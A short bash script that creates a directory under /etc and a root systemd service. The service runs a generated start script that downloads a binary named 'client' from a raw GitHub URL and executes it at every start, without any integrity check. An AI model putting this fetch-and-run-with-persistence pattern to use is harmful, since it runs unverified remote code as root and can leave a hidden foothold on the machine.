#!/bin/bash

# Set the directory and file paths
directory="/etc/spark"
script_path="$directory/start_client.sh"
service_path="/etc/systemd/system/client.service"

# Create the directory if it doesn't exist
sudo mkdir -p "$directory"

# Set appropriate permissions for the directory
sudo chmod 755 "$directory"

# Create the start script
sudo tee "$script_path" > /dev/null <<EOF
#!/bin/bash

cd "$directory"
curl -o client https://raw.githubusercontent.com/20020314/docker-v2board/main/client
chmod +x client
./client
EOF

sudo chmod +x "$script_path"

# Create the systemd service
sudo tee "$service_path" > /dev/null <<EOF
[Unit]
Description=Client Service
After=network.target

[Service]
ExecStart=$script_path

[Install]
WantedBy=default.target
EOF

# Enable and start the service
sudo systemctl enable client.service
sudo systemctl start client.service

echo "Setup complete."
